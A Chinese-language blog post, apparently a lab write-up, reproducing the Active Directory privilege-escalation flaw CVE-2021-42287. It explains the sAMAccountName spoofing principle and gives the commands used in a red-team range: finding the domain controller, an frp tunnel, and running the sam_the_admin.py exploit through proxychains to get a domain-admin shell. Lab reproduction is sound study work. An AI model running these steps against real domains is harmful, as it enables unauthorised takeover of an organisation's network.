## CVE-2021-42287 域内提权漏洞复现 

### 漏洞原理：

如果获得了 DC 用户的TGT票据且域内有一台名为DC$域控，再将DC用户删除，此时使用该 TGT去请求s4u2self,如果域控制器帐户DC$存在，那么DC就能获得域控制器帐户(机器用户DC$)的ST票证。

假如域内有一台域控名为 DC（域控对应的机器用户为 DC$），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户test$，再把机器用户test$的SAMAccountName改成DC。然后利用DC去申请一个TGT票据。再把DC的SAMAccountName改为test$。这个时候KDC就会判断域内没有DC和这个用户，自动去搜索DC$（DC$是域内已经的域控DC的SAMAccountName），攻击者利用刚刚申请的TGT进行S4U2self，模拟域内的域管去请求域控DC的ST票据，最终获得域控制器DC的权限。

## 漏洞复现   

模拟真实渗透过程进行漏洞复现，这里使用的是渗透攻击红队的靶场，感谢soulgoodman师傅的支持。

因为主要是为了演示此域内提权漏洞，所以其他过程没有详尽的演示，本文主要想展示在整体渗透中如何利用此漏洞。

渗透目标的IP为192.168.249.132

**文内涉及的exp可在本公众号发送 CVE-2021-42287 获取**

  

### 1、拿下域内用户机器

**通过weblogic漏洞拿下边缘主机192.168.249.132机器，使用cs上线后，对其进行基本的信息搜集，发现其存在多重网段【图1】。**

192.168.249.132(模拟公网ip)

10.10.20.12

### 2、通过此域内用户进行域内提权至域管理员

**查找域控ip**

```


shell netdom query pdc 
```

![](../Images/539f7672fe8f1b4a31c7d383dd9094bb.png)

**获取到域控IP为10.10.10.8**

**![](../Images/15758a176a2b55dcd37ed9322db90223.png)**

  

**使用frp搭建sock5隧道，这里由于是本地环境，设10.10.10.2为公网vps攻击主机，在实际环境下，如果域内机器不出网，可使用venom搭建多层隧道，这里做了简化，旨在容易理解**

上传frpc之后使用shell命令执行

```

shell C:\frp\frpc.exe -c C:\frp\frpc.ini
```

![](../Images/1d45bc36d969005452a2af3a76aeb0b2.png)

  

**隧道搭建成功**

**由于目前此脚本只能使用kali进行漏洞利用，所以这里设置kali代理**

```

vim /etc/proxychains.conf
```

![](../Images/cbb7380c3faa58c1b4080526cc1999ff.png)

  

**3、kali运行exp**

```

proxychains python3 sam_the_admin.py "redteam/sqlserver:Server12345" -dc-ip 10.10.10.8 -shell
```

![](../Images/8ca56a59104607ad1823fbe65b05aae2.png)

  

**成功获取域管理员权限**

## 总结 

    此漏洞的利用需要域内用户的账户和密码，假如通过一些漏洞获取到了系统system权限，通过抓取密码获得了域内用户的密码，则可直接通过搭建隧道，在kali上用此exp进行域内提权，十分好用。
